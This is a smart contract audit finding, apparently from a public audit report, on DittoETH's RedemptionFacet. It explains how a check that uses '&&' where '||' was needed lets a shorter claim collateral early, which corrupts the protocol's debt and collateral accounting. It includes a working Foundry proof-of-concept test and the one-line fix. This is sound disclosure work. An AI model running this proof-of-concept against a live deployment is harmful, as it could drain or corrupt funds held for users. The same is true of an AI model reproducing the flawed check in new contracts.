[H-05] Flawed if check causes inaccurate tracking of the protocol’sercDebtand collateral
Submitted bysamuraii77, also found bysamuraii77andserial-coder
A flawed if check using&&instead of||inRedemptionFacet::claimRemainingCollateral()leads to a break of one of the core protocol invariants. The total collateral andercDebtof an asset should always equal the total collateral andercDebtof allshortRecordscombined. However, this will not be the case if the scenario explained below takes place. This results in the protocol holding inaccurate values of theirercDebtand collateral which are extremely important values used for very important calculations across the entire protocol.
Proof of Concept
Imagine the following scenario:
Shorterhas a fewshortRecords.Redeemerproposes a redemption for one of theshortRecordsowned byshorter.ThetimeToDisputepasses.Redeemer2proposes redemption for another one of theshortRecordsowned byshorter.Even thoughtimeToDisputehas not passed forredeemer2,shorteris able to callRedemptionFacet::claimCollateral()successfully because of a flawed if check.
if(claimProposal.shorter!=msg.sender&&claimProposal.shortId!=id)revertErrors.CanOnlyClaimYourShort();
5.1ShortercallsRedemptionFacet::claimRemainingCollateral()with the address ofredeemerand with the ID of theshortRecordproposed byredeemer2.5.2redeemerAssetUserin the function is nowredeemer.5.3 The check for time to dispute passes as enough time has passed forredeemer’stimeToDispute.5.4claimProposalis thedecodedProposalDataofredeemer.5.5 The if check doesn’t lead to a revert because it is flawed,claimProposal.shorteris==tomsg.senderas he is the owner of the initialshortRecord; however, theclaimProposal.shortIdis not equal to the given ID sinceclaimProposal.shortIdis based on the initial redeemer proposal and the given ID is the ID for theshortRecordproposed byredeemer2which makes the if check (true&&false) resulting in false and the code continues.5.6_claimRemainingCollateral()is called with theshorteraddress (msg.sender) andshortIdequal to the given ID (ID of theshortRecordproposed byredeemer2).5.7 Check successfully passes andshorterclaims collateral and deletesshortRecordwithout having to wait thetimeToDispute.As theshortRecordis deleted beforetimeToDisputeis over,RedemptionFacet::disputeRedemption()is still callable.Disputersuccessfully disputes the already deletedshortRecord.RedemptionFacet::disputeRedemption()gives back thecollateralandercDebtto the already deletedshortRecord.It also increments the asset’scollateralandercDebt.
for(uint256i=incorrectIndex;i<decodedProposalData.length;i++) {currentProposal=decodedProposalData[i];STypes.ShortRecordstoragecurrentSR=s.shortRecords[d.asset][currentProposal.shorter][currentProposal.shortId];currentSR.collateral+=currentProposal.colRedeemed;currentSR.ercDebt+=currentProposal.ercDebtRedeemed;d.incorrectCollateral+=currentProposal.colRedeemed;d.incorrectErcDebt+=currentProposal.ercDebtRedeemed;}s.vault[Asset.vault].dethCollateral+=d.incorrectCollateral;Asset.dethCollateral+=d.incorrectCollateral;Asset.ercDebt+=d.incorrectErcDebt;
Since theshortRecordis deleted, it makes the asset’sercDebtandcollateralinaccurate as it includes theercDebtandcollateralof a non-existentshortRecord.Such inaccuracy is detrimental to the protocol as inaccurate values for theercDebtandcollateralwill be used across the whole protocol for extremely important functions and calculations.
Add the following POC function toRedemption.t.sol:
functiontestRuinsDebtAndCollateralTracking()public{// Set up all of the usersaddressshorter=sender;addressredeemer=receiver;addressredeemer2=makeAddr('redeemer2');depositEth(redeemer2,INITIAL_ETH_AMOUNT);addressdisputer=makeAddr('disputer');for(uint256i=0;i<6;i++) {if(i%2==0) {fundLimitBidOpt(DEFAULT_PRICE,DEFAULT_AMOUNT,redeemer);fundLimitShortOpt(DEFAULT_PRICE,DEFAULT_AMOUNT,shorter);}else{fundLimitBidOpt(DEFAULT_PRICE,DEFAULT_AMOUNT,redeemer2);fundLimitShortOpt(DEFAULT_PRICE,DEFAULT_AMOUNT,shorter);}}_setETH(50000ether);fundLimitBidOpt(DEFAULT_PRICE-0.000000001ether,DEFAULT_AMOUNT,redeemer2);fundLimitShortOpt(DEFAULT_PRICE-0.000000001ether,DEFAULT_AMOUNT,shorter);MTypes.ProposalInput[]memoryredeemerProposalInputs=newMTypes.ProposalInput[](1);redeemerProposalInputs[0] =MTypes.ProposalInput({shorter:shorter,shortId:C.SHORT_STARTING_ID,shortOrderId:0});_setETH(1000ether);vm.prank(redeemer);diamond.proposeRedemption(asset,redeemerProposalInputs,DEF_REDEMPTION_AMOUNT,MAX_REDEMPTION_FEE);// Redeemer creates a proposalskip(diamond.getAssetUserStruct(asset,redeemer).timeToDispute);// Skip the time to dispute for the first proposal (5401 seconds)MTypes.ProposalInput[]memoryredeemer2ProposalInputs=newMTypes.ProposalInput[](1);redeemer2ProposalInputs[0] =MTypes.ProposalInput({shorter:shorter,shortId:C.SHORT_STARTING_ID+1,shortOrderId:0});vm.prank(redeemer2);diamond.proposeRedemption(asset,redeemer2ProposalInputs,DEF_REDEMPTION_AMOUNT,MAX_REDEMPTION_FEE);// Redeemer2 creates a proposalassert(diamond.getOffsetTime() <diamond.getAssetUserStruct(asset,redeemer2).timeToDispute);// Not enough time has passed in order to redeem the second proposal (5402 < 10802)vm.expectRevert(Errors.TimeToDisputeHasNotElapsed.selector);vm.prank(redeemer2);diamond.claimRedemption(asset);// This correctly reverts as 5401 seconds have not passed and bug is non-existent in claimRedemption()STypes.ShortRecord[]memoryshortRecordsBefore=diamond.getShortRecords(asset,shorter);// Get shortRecords before the deletionvm.prank(shorter);diamond.claimRemainingCollateral(asset,redeemer,0,C.SHORT_STARTING_ID+1);// Claiming collateral without waiting (this is the bug)STypes.ShortRecord[]memoryshortRecordsAfter=diamond.getShortRecords(asset,shorter);// Get shortRecords after the deletionuint256totalShortRecordsCollateralBefore;uint256totalShortRecordsDebtBefore;for(uint256i=0;i<shortRecordsAfter.length;i++) {// Get the total collateral and total debt for the short recordstotalShortRecordsCollateralBefore+=shortRecordsAfter[i].collateral;totalShortRecordsDebtBefore+=shortRecordsAfter[i].ercDebt;}// Compare the total collateral and total debt based on the short records vs. based on the asset struct (they are equal as they should be)STypes.AssetmemoryassetStruct=diamond.getAssetStruct(asset);assertEq(totalShortRecordsCollateralBefore,assetStruct.dethCollateral);// 32500000000000000000assertEq(totalShortRecordsDebtBefore,assetStruct.ercDebt);// 20000000000000000000000assertEq(shortRecordsAfter.length,shortRecordsBefore.length-1);// Deletion happenedvm.prank(disputer);diamond.disputeRedemption(asset,redeemer2,0,shorter,C.SHORT_STARTING_ID+6);// Dispute with a shortRecord with a lower CRSTypes.ShortRecord[]memoryshortRecordsFinal=diamond.getShortRecords(asset,shorter);// Current short recordsSTypes.AssetmemorycurrentAssetStruct=diamond.getAssetStruct(asset);// Current asset structuint256currentTotalShortRecordsCollateral;uint256currentTotalShortRecordsDebt;for(uint256i=0;i<shortRecordsFinal.length;i++) {// Get the total collateral and total debt for the short recordscurrentTotalShortRecordsCollateral+=shortRecordsFinal[i].collateral;currentTotalShortRecordsDebt+=shortRecordsFinal[i].ercDebt;}assert(currentTotalShortRecordsDebt!=currentAssetStruct.ercDebt);// 25000000000000000000000 30000000000000000000000assert(currentTotalShortRecordsCollateral!=currentAssetStruct.dethCollateral);// 39999970000000000000 44999969999999999999}
Recommended Mitigation Steps
Use||instead of&&
+ if (claimProposal.shorter != msg.sender || claimProposal.shortId != id) revert Errors.CanOnlyClaimYourShort();- if (claimProposal.shorter != msg.sender && claimProposal.shortId != id) revert Errors.CanOnlyClaimYourShort();
Assessed type
Invalid Validation
ditto-eth (DittoETH) confirmed